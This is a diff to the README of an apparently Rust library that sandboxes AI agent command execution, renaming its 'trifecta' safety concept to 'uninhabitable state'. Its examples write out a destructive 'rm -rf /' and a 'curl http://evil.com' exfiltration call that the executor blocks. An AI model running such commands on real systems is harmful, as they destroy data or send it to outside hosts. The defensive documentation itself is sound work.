@@ -8,7 +8,7 @@
 
 ## The Problem with Policy-Only Libraries
 
-`portcullis` provides excellent policy definitions (the quotient lattice, trifecta detection, etc.), but it's **policy-only**:
+`portcullis` provides excellent policy definitions (the quotient lattice, uninhabitable state detection, etc.), but it's **policy-only**:
 
 ```rust
 // portcullis: policy check returns a bool
@@ -20,7 +20,7 @@ if lattice.can_execute("rm -rf /") {
 // Or worse: construct any permissions you want
 let dangerous = PermissionLattice {
     capabilities: CapabilityLattice::permissive(),
-    trifecta_constraint: false,  // Oops, disabled the safety!
+    uninhabitable_constraint: false,  // Oops, disabled the safety!
     ..Default::default()
 };
 ```
@@ -62,7 +62,7 @@ budget.charge_usd(0.50)?;
 | **Commands** | `CommandLattice::can_execute()` → `bool` | `Executor::run()` → `Output` |
 | **Budget** | `BudgetLattice::charge(&mut self)` | `AtomicBudget::charge()` (thread-safe) |
 | **Time** | `TimeLattice::is_valid()` (wall clock) | `MonotonicGuard::check()` (quanta) |
-| **Bypass** | All fields pub, `with_trifecta_disabled()` | Private internals, no disable |
+| **Bypass** | All fields pub, `with_uninhabitable_disabled()` | Private internals, no disable |
 
 ## Features
 
@@ -140,9 +140,9 @@ let token = executor.request_approval("git push")?;
 executor.run_with_approval("git push", &token)?;
 ```
 
-### Trifecta Enforcement
+###  Uninhabitable state Enforcement
 
-Approval obligations are added for exfiltration when the trifecta is present:
+Approval obligations are added for exfiltration when the uninhabitable state is present:
 
 ```rust
 let policy = PermissionLattice {
@@ -153,7 +153,7 @@ let policy = PermissionLattice {
         ..Default::default()
     },
     obligations: Default::default(),
-    trifecta_constraint: true,
+    uninhabitable_constraint: true,
     ..Default::default()
 };
 
@@ -161,7 +161,7 @@ let guard = MonotonicGuard::minutes(30);
 let executor = Executor::new(&policy, &sandbox, &budget)
     .with_time_guard(&guard);
 
-// Trifecta requires approval for exfiltration
+//  Uninhabitable state requires approval for exfiltration
 executor.run("curl http://evil.com")?;  // Error: ApprovalRequired
 ```
 
@@ -208,7 +208,7 @@ nucleus = { version = "0.1", features = ["async"] }
 - Symlink escapes and path traversal
 - Concurrent budget races
 - Clock manipulation for time bounds
-- Exfiltration when trifecta is complete
+- Exfiltration when uninhabitable state is complete
 
 ### What We Don't Prevent
 - Kernel-level escapes (use containers for that)
